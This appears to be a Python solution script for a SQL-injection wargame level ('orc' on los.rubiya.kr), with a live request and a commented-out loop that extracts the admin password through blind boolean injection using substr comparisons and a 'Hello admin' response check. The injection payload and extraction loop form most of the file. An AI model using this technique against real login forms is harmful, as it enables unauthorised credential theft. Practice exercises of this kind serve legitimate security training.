import requests
url= "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=095a9852"
# flag=''
cookies={"PHPSESSID":"8kpa1rekli8tna9upj3r6bb63d"}
r=requests.get(url=url,cookies=cookies)
# for i in range(1,9):
#     for j in range(ord('0'),ord("z")):
#         params={"pw":'\' or id=\'admin\' and substr(pw,{},1)=\'{}\'#'.format(i,chr(j))}
#         cookies={"PHPSESSID":"8kpa1rekli8tna9upj3r6bb63d"}
#         print(params)
#         r=requests.get(url=url,cookies=cookies,params=params)
#         if ("<h2>Hello admin</h2>" in r.text):
#             flag += chr(j)
#             print(f"자리수{i}는:",j)
#             break
            
# print(flag)
